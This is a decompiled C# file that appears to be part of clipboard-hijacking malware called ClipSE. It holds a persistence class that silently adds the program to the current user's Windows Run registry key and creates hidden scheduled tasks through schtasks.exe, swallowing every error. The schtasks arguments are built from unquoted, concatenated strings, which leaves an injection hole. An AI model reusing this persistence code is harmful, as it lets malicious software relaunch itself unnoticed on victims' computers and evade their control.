using System;
using System.Diagnostics;
using Microsoft.Win32;

namespace ClipSE
{
	// Token: 0x0200000C RID: 12
	public static class RunSystem
	{
		// Token: 0x06000019 RID: 25 RVA: 0x00002C3C File Offset: 0x00000E3C
		public static void RegInizialize(bool enable, string name, string localpath)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
				{
					if (!enable)
					{
						try
						{
							if (registryKey != null)
							{
								registryKey.DeleteValue(name);
							}
							goto IL_30;
						}
						catch
						{
							goto IL_30;
						}
					}
					try
					{
						registryKey.SetValue(name, localpath);
					}
					catch
					{
					}
					IL_30:;
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002CC0 File Offset: 0x00000EC0
		public static bool Scheduler(bool status, string timeset, int count, string priority, string taskname, string filepath)
		{
			if (!string.IsNullOrWhiteSpace(taskname) && !string.IsNullOrWhiteSpace(filepath))
			{
				ProcessWindowStyle windowStyle = ProcessWindowStyle.Hidden;
				ProcessStartInfo processStartInfo = new ProcessStartInfo
				{
					FileName = "schtasks.exe",
					CreateNoWindow = false,
					WindowStyle = windowStyle
				};
				try
				{
					switch (status)
					{
					case false:
						processStartInfo.Arguments = "/delete /tn " + taskname + " /f";
						break;
					case true:
						processStartInfo.Arguments = string.Concat(new object[]
						{
							"/create /sc ",
							timeset,
							" /mo ",
							count,
							" /rl ",
							priority,
							" /tn ",
							taskname,
							" /tr ",
							filepath,
							" /f"
						});
						break;
					}
				}
				catch (Exception)
				{
				}
				try
				{
					using (Process process = Process.Start(processStartInfo))
					{
						process.Refresh();
						process.WaitForExit();
					}
				}
				catch (Exception)
				{
				}
				return true;
			}
			return false;
		}

		// Token: 0x0400001C RID: 28
		private const string REG = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	}
}
